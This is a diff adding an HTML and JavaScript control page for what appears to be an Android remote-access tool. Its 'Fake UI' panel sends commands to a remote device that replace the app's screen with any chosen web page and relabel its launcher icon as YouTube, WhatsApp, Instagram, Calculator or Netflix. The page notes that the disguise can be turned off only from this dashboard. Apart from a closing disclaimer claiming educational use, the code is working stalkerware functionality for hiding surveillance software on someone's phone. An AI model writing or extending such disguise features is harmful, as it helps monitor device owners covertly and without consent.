@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake UI - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <style>
+        .fake-panel {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+
+        .fake-panel h3 {
+            color: var(--accent);
+            font-size: 0.9rem;
+            margin-bottom: 12px;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* Toggle Switch */
+        .toggle-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 0;
+        }
+
+        .toggle-label {
+            color: var(--text-primary);
+            font-size: 0.85rem;
+        }
+
+        .toggle-sub {
+            color: var(--text-muted, #5a7a5a);
+            font-size: 0.72rem;
+            margin-top: 2px;
+        }
+
+        .switch {
+            position: relative;
+            width: 52px;
+            height: 28px;
+            flex-shrink: 0;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            inset: 0;
+            background: #1a2332;
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            cursor: pointer;
+            transition: 0.25s;
+        }
+
+        .slider:before {
+            content: '';
+            position: absolute;
+            width: 22px;
+            height: 22px;
+            left: 3px;
+            top: 2px;
+            background: #555;
+            border-radius: 50%;
+            transition: 0.25s;
+        }
+
+        .switch input:checked+.slider {
+            background: rgba(0, 255, 65, 0.2);
+            border-color: var(--accent);
+        }
+
+        .switch input:checked+.slider:before {
+            transform: translateX(23px);
+            background: var(--accent);
+            box-shadow: 0 0 8px rgba(0, 255, 65, 0.5);
+        }
+
+        /* URL Input */
+        .url-input {
+            width: 100%;
+            padding: 10px 14px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            color: var(--text-primary);
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+
+        .url-input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 6px rgba(0, 255, 65, 0.15);
+        }
+
+        .url-input::placeholder {
+            color: var(--text-muted, #3a5a3a);
+        }
+
+        .label-input {
+            width: 100%;
+            padding: 10px 14px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            color: var(--text-primary);
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            box-sizing: border-box;
+            margin-top: 10px;
+        }
+
+        .label-input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .label-input::placeholder {
+            color: var(--text-muted, #3a5a3a);
+        }
+
+        /* Icon Grid */
+        .icon-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+
+        .icon-card {
+            background: var(--bg-panel);
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 14px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .icon-card:hover {
+            border-color: rgba(0, 255, 65, 0.3);
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        .icon-card.selected {
+            border-color: var(--accent);
+            background: rgba(0, 255, 65, 0.08);
+            box-shadow: 0 0 12px rgba(0, 255, 65, 0.15);
+        }
+
+        .icon-preview {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            margin: 0 auto 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+        }
+
+        .icon-name {
+            color: var(--text-primary);
+            font-size: 0.75rem;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* Status */
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            font-size: 0.78rem;
+            font-family: 'Courier New', monospace;
+        }
+
+        .status-key {
+            color: var(--text-muted, #5a7a5a);
+        }
+
+        .status-val {
+            color: var(--text-primary);
+        }
+
+        .status-val.on {
+            color: var(--accent);
+        }
+
+        .status-val.off {
+            color: #ff5252;
+        }
+
+        /* Apply Button */
+        .btn-apply {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 1px;
+            margin-top: 8px;
+        }
+
+        .btn-apply:hover {
+            background: rgba(0, 255, 65, 0.2);
+            box-shadow: 0 0 12px rgba(0, 255, 65, 0.2);
+        }
+
+        .btn-apply:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-apply.saving {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .secret-hint {
+            color: var(--text-muted, #3a5a3a);
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 12px;
+            font-family: 'Courier New', monospace;
+            opacity: 0.6;
+        }
+
+        @media (max-width: 480px) {
+            .icon-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .container {
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&lt;-- Back to Dashboard</a>
+        <div class="header-row">
+            <h1>&#x1F3AD; Fake UI</h1>
+        </div>
+
+        <!-- Toggle -->
+        <div class="fake-panel">
+            <h3>&#x26A1; DISGUISE MODE</h3>
+            <div class="toggle-row">
+                <div>
+                    <div class="toggle-label">Enable Fake UI</div>
+                    <div class="toggle-sub">Replace app UI with a WebView loading your URL</div>
+                </div>
+                <label class="switch">
+                    <input type="checkbox" id="fake-toggle">
+                    <span class="slider"></span>
+                </label>
+            </div>
+        </div>
+
+        <!-- URL -->
+        <div class="fake-panel">
+            <h3>&#x1F310; FAKE UI URL</h3>
+            <input type="text" class="url-input" id="fake-url" placeholder="https://www.example.com"
+                autocomplete="off" />
+            <div class="toggle-sub" style="margin-top:6px">Enter any URL — this page will load when the app is opened
+            </div>
+        </div>
+
+        <!-- Icon Picker -->
+        <div class="fake-panel">
+            <h3>&#x1F3A8; LAUNCHER DISGUISE</h3>
+            <div class="icon-grid" id="icon-grid"></div>
+            <div class="toggle-sub" style="margin-top:8px">Icon & app name change together (Android limitation)</div>
+        </div>
+
+        <!-- Apply -->
+        <button class="btn-apply" id="apply-btn" onclick="applySettings()">&#x1F680; APPLY DISGUISE</button>
+
+        <!-- Status -->
+        <div class="fake-panel" style="margin-top:16px">
+            <h3>&#x1F4CA; CURRENT STATUS</h3>
+            <div id="status-container">
+                <div class="status-row">
+                    <span class="status-key">Status</span>
+                    <span class="status-val" id="st-enabled">Loading...</span>
+                </div>
+                <div class="status-row">
+                    <span class="status-key">Theme</span>
+                    <span class="status-val" id="st-theme">—</span>
+                </div>
+                <div class="status-row">
+                    <span class="status-key">URL</span>
+                    <span class="status-val" id="st-url">—</span>
+                </div>
+                <div class="status-row">
+                    <span class="status-key">Label</span>
+                    <span class="status-val" id="st-label">—</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="secret-hint">&#x1F512; Fake UI can ONLY be disabled from this dashboard</div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        let selectedTheme = 'calculator';
+
+        const THEMES = [
+            { id: 'youtube', icon: '▶️', label: 'YouTube', color: '#FF0000' },
+            { id: 'netflix', icon: '🎬', label: 'Netflix', color: '#000000' },
+            { id: 'calculator', icon: '🧮', label: 'Calculator', color: '#FF5722' },
+            { id: 'whatsapp', icon: '💬', label: 'WhatsApp', color: '#25D366' },
+            { id: 'instagram', icon: '📷', label: 'Instagram', color: '#C13584' }
+        ];
+
+        function buildIconGrid() {
+            var grid = document.getElementById('icon-grid');
+            var html = '';
+            THEMES.forEach(function (t) {
+                html += '<div class="icon-card' + (t.id === selectedTheme ? ' selected' : '') +
+                    '" data-theme="' + t.id + '" onclick="selectTheme(\'' + t.id + '\')">' +
+                    '<div class="icon-preview" style="background:' + t.color + '">' + t.icon + '</div>' +
+                    '<div class="icon-name">' + t.label + '</div>' +
+                    '</div>';
+            });
+            grid.innerHTML = html;
+        }
+
+        function selectTheme(themeId) {
+            selectedTheme = themeId;
+            document.querySelectorAll('.icon-card').forEach(function (c) {
+                c.classList.toggle('selected', c.dataset.theme === themeId);
+            });
+        }
+
+        async function loadStatus() {
+            try {
+                var resp = await api.sendCommand(deviceId, 'fake_ui_get');
+                var data = resp.data || resp;
+                if (data.data) data = data.data;
+
+                document.getElementById('fake-toggle').checked = !!data.enabled;
+                document.getElementById('fake-url').value = data.url || '';
+
+                if (data.theme) {
+                    selectedTheme = data.theme;
+                    document.querySelectorAll('.icon-card').forEach(function (c) {
+                        c.classList.toggle('selected', c.dataset.theme === data.theme);
+                    });
+                }
+
+                // Update status display
+                var stEnabled = document.getElementById('st-enabled');
+                stEnabled.textContent = data.enabled ? 'ACTIVE' : 'DISABLED';
+                stEnabled.className = 'status-val ' + (data.enabled ? 'on' : 'off');
+                document.getElementById('st-theme').textContent = data.theme || '—';
+                document.getElementById('st-url').textContent = data.url || '—';
+                document.getElementById('st-label').textContent = data.label || '—';
+            } catch (e) {
+                document.getElementById('st-enabled').textContent = 'Error: ' + e.message;
+                document.getElementById('st-enabled').className = 'status-val off';
+            }
+        }
+
+        async function applySettings() {
+            var btn = document.getElementById('apply-btn');
+            var enabled = document.getElementById('fake-toggle').checked;
+            var url = document.getElementById('fake-url').value.trim();
+            var theme = THEMES.find(function (t) { return t.id === selectedTheme; });
+            var label = theme ? theme.label : 'Calculator';
+
+            if (enabled && !url) {
+                api.showToast('Enter a URL for the fake UI', 'error');
+                return;
+            }
+
+            btn.classList.add('saving');
+            btn.textContent = '⏳ APPLYING...';
+
+            try {
+                await api.sendCommand(deviceId, 'fake_ui_set', {
+                    enabled: enabled,
+                    url: url,
+                    theme: selectedTheme,
+                    label: label
+                });
+                api.showToast(enabled ? 'Disguise activated! Icon will change shortly.' : 'Disguise disabled.', 'success');
+                await loadStatus();
+            } catch (e) {
+                api.showToast('Failed: ' + e.message, 'error');
+            } finally {
+                btn.classList.remove('saving');
+                btn.textContent = '🚀 APPLY DISGUISE';
+            }
+        }
+
+        // Init
+        buildIconGrid();
+        loadStatus();
+    </script>
+
+    <!-- Disclaimer -->
+    <div class="container">
+        <div class="disclaimer">
+            <h4>&#x26A0;&#xFE0F; Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely
+                manage their own devices. Installing or using this application on a device without the owner's explicit
+                consent is illegal and unethical. The developers assume no liability for misuse. By using this
+                application, you agree that you are solely responsible for how it is used.</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="site-footer">
+        <p class="footer-created">Created by</p>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="footer-brand">thiyo-de</a>
+        <p class="footer-copy">&copy; 2025 All Rights Reserved</p>
+    </footer>
+</body>
+
+</html>
